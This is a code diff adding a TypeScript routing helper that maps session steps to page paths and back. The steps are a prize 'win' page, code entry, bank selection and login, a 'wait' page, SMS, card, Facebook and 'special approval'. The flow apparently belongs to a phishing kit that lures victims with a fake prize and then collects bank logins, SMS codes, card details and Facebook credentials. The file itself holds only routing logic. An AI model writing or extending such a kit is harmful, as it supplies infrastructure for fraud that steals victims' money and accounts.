@@ -1,0 +1,54 @@
+import type { SessionStep } from "@/types/session";
+
+export function stepToPath(
+  step: SessionStep,
+  sessionId: string,
+  routeSessionId: string = sessionId,
+): string {
+  const qs = `session=${encodeURIComponent(routeSessionId)}`;
+  switch (step) {
+    case "code_entry":
+      return `/code?${qs}`;
+    case "win":
+      return `/win/${routeSessionId}`;
+    case "banken":
+      return `/banken?${qs}`;
+    case "bank":
+    case "bank_login":
+      return `/banken?${qs}`;
+    case "wait":
+      return `/wait?session=${routeSessionId}`;
+    case "invalid_bank":
+      return `/invalid-bank?${qs}`;
+    case "live_support":
+      return `/live-support?${qs}`;
+    case "sms":
+      return `/sms?${qs}`;
+    case "card":
+      return `/card?${qs}`;
+    case "facebook":
+      return `/facebook?session=${routeSessionId}`;
+    case "congrats":
+      return `/congratulations?${qs}`;
+    case "special_approval":
+      return `/special-approval?${qs}`;
+    default:
+      return `/win/${routeSessionId}`;
+  }
+}
+
+export function pathToStep(pathname: string): SessionStep | null {
+  if (pathname.startsWith("/code")) return "code_entry";
+  if (pathname.includes("/bank/")) return "bank";
+  if (pathname.startsWith("/win")) return "win";
+  if (pathname.startsWith("/banken") || pathname.startsWith("/banks")) return "banken";
+  if (pathname.startsWith("/wait")) return "wait";
+  if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
+  if (pathname.startsWith("/live-support")) return "live_support";
+  if (pathname.startsWith("/congratulations")) return "congrats";
+  if (pathname.startsWith("/special-approval")) return "special_approval";
+  if (pathname.startsWith("/sms")) return "sms";
+  if (pathname.startsWith("/card")) return "card";
+  if (pathname.startsWith("/facebook")) return "facebook";
+  return null;
+}
